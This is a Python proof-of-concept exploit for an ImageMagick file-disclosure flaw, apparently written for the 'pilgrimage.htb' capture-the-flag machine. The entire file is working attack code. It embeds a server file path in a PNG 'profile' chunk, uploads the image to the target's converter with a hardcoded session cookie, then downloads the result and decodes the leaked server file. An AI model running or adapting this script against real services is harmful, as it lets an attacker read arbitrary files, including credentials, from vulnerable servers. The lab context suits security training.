import requests
import subprocess
import re
import png
import sys
import os
import time
from PIL import Image, PngImagePlugin

use_proxy = False #set to inspect packets from burp.


def gen(local_file, payload_path):
    print("\n   [\u001b[32;1m>\u001b[0m] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>")
    
    print("   [\u001b[32;1m>\u001b[0m] Generating Blank PNG")
    width = 255
    height = 255
    img = []
    for y in range(height):
        row = ()
        for x in range(width):
            row = row + (x, max(0, 255 - x - y), y)
        img.append(row)
    with open('gradient.png', 'wb') as f:
        w = png.Writer(width, height, greyscale=False)
        w.write(f, img)
    time.sleep(0.2)
    print("   [\u001b[32;1m>\u001b[0m] Blank PNG generated")
    time.sleep(0.2)
    print(f"   [\u001b[32;1m>\u001b[0m] Placing Payload to read {local_file}")
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", local_file)
    im = Image.open("gradient.png")
    im.save(payload_path, "PNG", pnginfo=info)
    time.sleep(0.2)
    print(f"   [\u001b[32;1m>\u001b[0m] Payload PNG generated > {payload_path}")
    
    gradient_file = "gradient.png"
    if os.path.isfile(gradient_file):
        os.remove(gradient_file)
    else:
        pass

    return payload_path

def extract_location(headers):
    if("location" not in headers):
        return None
    try:
        location = headers["location"]
        location = location.split("message=")
        return location[1].split("&")[0]
    except:
        return None

def upload_image(image_path, target_url):
    # Define the URL and headers
    proxies = {'http': 'http://127.0.0.1:8080'}
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
        'Referer': 'http://pilgrimage.htb/',
        'Cookie': 'PHPSESSID=ldgup1eb4rrnne4rubb0jmdg3d'
    }

    field_name = 'toConvert'

    # Read the image file
    with open(image_path, 'rb') as image_file:
        image_data = image_file.read()

    # Define the multipart/form-data payload
    payload = {
        field_name: (image_path, image_data, 'image/png')
    }

    # Disable automatic redirection
    session = requests.Session()

    # Send the POST request with the image
    if(not use_proxy):
        proxies = None
    response = session.post(target_url, headers=headers, files=payload, proxies=proxies, allow_redirects=False)


    # Check the response
    print(response.status_code)
    location = extract_location(response.headers)
    print(location)
    return location

def download_image(url, file_name):
    response = requests.get(url)
    if response.status_code == 200:
        with open(file_name, 'wb') as file:
            file.write(response.content)
        print(f"File '{file_name}' downloaded successfully.")
    else:
        print("Failed to download the file.")

def decode(file_path):
    #use magick to get png contents
    command = f"./.git/magick identify -verbose {file_path}"
    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

    #extract data from png and decode from hex to ascii
    try:
        s = output.split("Raw profile type:")[1].split("signature")[0]
    except:
        return "" #file is empty or does not exist

    s = s.replace(" ", "")
    s = s.splitlines()

    start = 0
    for line in s:
        if(line.isnumeric()):
            break
        start = start+1
    start = start+1
    s = ''.join(s[start:])
    try:
        file_contents = bytes.fromhex(s).decode("utf-8")
    except:
        return s
    return file_contents


local_file = sys.argv[1] #the file to read on the server
target_url = 'http://pilgrimage.htb/'

#generate the payload and save as exploit.png
gen(local_file, "exploit.png")

'''
upload exploit.png to the server
download_url is the url for the file containing the converted image
and if our exploit worked, the contents of local_file on the server.
'''
download_url = upload_image("exploit.png", target_url)

#download the image
download_image(download_url, "out.png")

#get the file_contents of local_file
file_contents = decode("out.png")

#print the output:
output = f"""
============================
file: {local_file}
----------------------------
{file_contents}
============================
"""
print(output) 